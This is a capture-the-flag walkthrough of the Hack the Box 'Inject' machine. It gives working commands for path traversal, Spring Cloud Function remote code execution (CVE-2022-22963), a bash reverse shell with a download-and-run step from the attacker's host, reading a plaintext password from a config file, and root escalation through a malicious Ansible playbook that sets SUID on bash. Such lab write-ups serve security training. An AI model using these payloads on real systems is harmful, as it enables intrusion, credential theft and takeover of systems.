# Hack the Box Inject 
This is a walkthrough for how I got user and root flags for the Inject Hack the Box machine. 
Date: 3/13/2023

Target Machine IP: 10.10.11.204

## Recon

To start I began by running Nmap agains the machine with the -A ( to enable OS and version detection, script scanning, and traceroute) and -T4 (faster execution) flags
`nmap -A -T4 10.10.11.204`

I got the following results from my scan:
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Lets start by examining port 8080. We can see that it is hosting some http appliction. I visited the site in my browser to confirm. 
[image](images/site.png)

I  ran a dirb scan to identify more directories
`dirb http://10.10.11.204:8080`
I got the following result:
--- Scanning URL: http://10.10.11.204:8080/ ----
+ http://10.10.11.204:8080/blogs (CODE:200|SIZE:5371)                                                                           
+ http://10.10.11.204:8080/environment (CODE:500|SIZE:712)                                                                      
+ http://10.10.11.204:8080/error (CODE:500|SIZE:106)                                                                            
+ http://10.10.11.204:8080/register (CODE:200|SIZE:5654)                                                                        
+ http://10.10.11.204:8080/upload (CODE:200|SIZE:1857)

I found an interesting page  http://10.10.11.204:8080/upload
[image](images/upload.png)

This page lets you upload an image and then see the image you uploaded. The URL for the uploaded image is http://10.10.11.204:8080/show_image?img=YOUR_IMAGE_FILE  

I noticed if the file was not there you get an HTTP error so I tried to use curl to get more in depth results. 
`curl --output - http://10.10.11.204:8080/show_image?img=none`
{"timestamp":"2023-03-13T14:31:58.373+00:00","status":500,"error":"Internal Server Error","message":"URL [file:/var/www/WebApp/src/main/uploads/none] cannot be resolved in the file system for checking its content length","path":"/show_image"} 

In the result I notice that the full file path was listed file:/var/www/WebApp/src/main/uploads/none. I decided to try other possible paths.
`curl --output - http://10.10.11.204:8080/show_image?img=../`
This listed the files in the directory uploads
[image](images/directoryList.png)

I used this to explore until I found /var/www/WebApp/pom.xml. 
`curl --output - http://10.10.11.204:8080/show_image?img=../../../pom.xml` `
This gave back an xml file with the configurations for the server. Here we can see it is using Java 11 and the Spring Framework. Googling the dependencies we can see that org.springframework.cloud version 3.2.2 is vulnerable (CVE-2022-22963). 
[image](images/springfw.png)

A github page showing how this can be exploited can be found here https://github.com/me2nuk/CVE-2022-22963.

According to the page we need to run:
`curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v`
[image](images/touchRCE.png)
If the server is vulnerable we should be able to find a new file in /tmp/ called pwned. I ran the command and then ran `curl --output - http://10.10.11.204:8080/show_image?img=../../../../../../tmp/` to verify the file 
[image](images/verifyRCE.png)

Since the file is there we know that this Remote Code Execution works. So lets set up a reverse shell. 

## User Flag

First I created a file called rev.sh (`nano rev.sh`) with the following code. This is the shell we are going to upload on our target. 
`#!/bin/bash'
`bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`
[image](images/revsh.png)

Next I started a python http server to host our file:
`python3 -m http.server 80`

In a seperate terminal tab I started Netcat:
`nc -lvnp 4444`

I then had the target download rev.sh from our python server using our RCE and having the target use curl:
`curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl YOUR_IP/rev.sh -o /tmp/rev")' --data-raw 'data' -v`
[image](images/downloadRCE.png)
I then executed rev.sh on the target using our RCE:
[image](images/executeRCE.png)

In the netcat terminal tab I now have an active shell: 
[image](images/frank.png)

In the /home directory we see two users frank and phil. In phil's home directory we can see the flag User.txt but we cannot open it so we need to swith users to phil. Looking through franks home directory we find .m2/settings.xml. When we read settings.xml we can see phil's password.
[image](images/settingsxml.png)

We can now switch users to become phil
`su phil`
[image](images/philPass.png)

We can get a more stable shell using:
`python3 -c 'import pty;pty.spawn("/bin/bash")'`
[image](images/upgradeShell.png)
We can now read the user.txt file in phil's home directory:
[image](images/user.png)

## System Flag

Now that we have the user flag we need to escalate to root and get the root flag. We can run linpeas (https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) to scan the server for vulnerablitites.
First I downloaded a copy linpeas to my localmachine:
`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`

I still had the python webserver running but if I did not I would have needed to run:
`python3 -m http.server 80`

On the taget machine I ran:
`curl YOUR_IP/linpeas.sh | sh`
[image](images/linpeas.png)

This started running linpeas. From this tool we can find that it is running Ansible Playbook.
**[image](images/ap.png)

Googleing I found this blog artical detailing how to exploit Ansible to gain root access https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/

First on our machine we need to create a .yml file with the mallcious tasks. I called this file pb.yml. In this file we need the following yaml:

-hosts: localhost
  tasks:
	-name: "whatever"
      shell: "chmod +s /bin/bash"
      become: true
[image](images/yml.png)
`chmod +s /bin/bash`  will allow phil to run bash as a super user.

Next we need to put this file in the target machines /opt/automation/tasks/ directory.
As phil I cd into that directory (`cd /opt/automation/tasks/`). Then we can use our python sever again to download the file.
`wget YOUR_IP/pb.yml`
[image](images/wget.png)

We now need to wait a few minutes for Ansible Playbook to run its automation tasks. After a few minutes have gone by you can run `bash -p` to elevate your shell.

Now we can cd into /root and read root.txt
[image](images/root.png)
